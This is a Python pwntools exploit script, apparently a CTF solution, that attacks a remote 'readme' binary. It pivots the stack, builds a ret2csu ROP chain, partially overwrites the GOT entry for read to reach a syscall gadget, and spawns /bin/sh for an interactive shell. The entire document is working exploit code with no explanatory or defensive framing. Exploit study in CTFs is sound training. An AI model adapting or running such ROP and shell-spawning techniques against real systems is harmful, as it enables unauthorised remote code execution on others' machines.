#!/usr/bin/env python

from pwn import *
context.arch = 'amd64'

r = remote('csie.ctf.tw', 10135)
# r = process('./readme')

r.recvuntil(':')

reset_eax_leave_ret = 0x400641
leave_ret = 0x400646
read_to_buf = 0x40062b

# mov rdx, r13
# mov rsi, r14
# mov rdi, r15
# call [r12+rbx*8]
alter_r12_r13_r15_call = 0x400690 
pop_rbx_rbp_r12_r13_r14_r15 = 0x4006aa

read_plt = 0x4004c0
read_got = 0x601020
buf1 = 0x602000 - 0x800
buf2 = buf1 + 0x100
buf3 = buf1 - 0x100

rop = flat([buf1, pop_rbx_rbp_r12_r13_r14_r15, 0, 1, read_got, 1, read_got, 0, alter_r12_r13_r15_call, 
    0, 0, 1, read_got, 8, read_got, 1, alter_r12_r13_r15_call, 
    0, 0, buf2+0xa0, 0, 0, 0, 0, reset_eax_leave_ret, 
    pop_rbx_rbp_r12_r13_r14_r15, 0, 1, read_got, 1, read_got, 0, alter_r12_r13_r15_call, 
    0,  0, 1, read_got, 0x10, buf3, 0, alter_r12_r13_r15_call, 
    0, 0, 1, read_got, 59, buf1, 0, alter_r12_r13_r15_call, 
    0, 0, buf1, buf3+8, 0, 0, buf3, alter_r12_r13_r15_call, 
    0, 0, 0])

print "rop1_length:", hex(len(rop))

payload = flat(['A'*0x20, buf1, read_to_buf]) # read to buf-0x20, mov rsp to buf


r.send(payload)

for i in range(0, 15):
    # payload to buf1-0x20 and will mov rsp to buf-0x20
    payload = flat(['A'*0x20, buf2+i*0x20, read_to_buf])     
    r.send(payload)
    payload = flat([ rop[i*0x20:(i+1)*0x20], buf1, read_to_buf])
    r.send(payload)


payload = flat(['A'*0x20, buf2-0x20, leave_ret])

r.send(payload)
r.send('\x2e')
r.send('\x20')
read_addr = u64(r.recv(8)) - 0xe
r.send('/bin/sh\x00' + p64(read_addr + 0xe))
r.send('A'*59)

r.interactive()
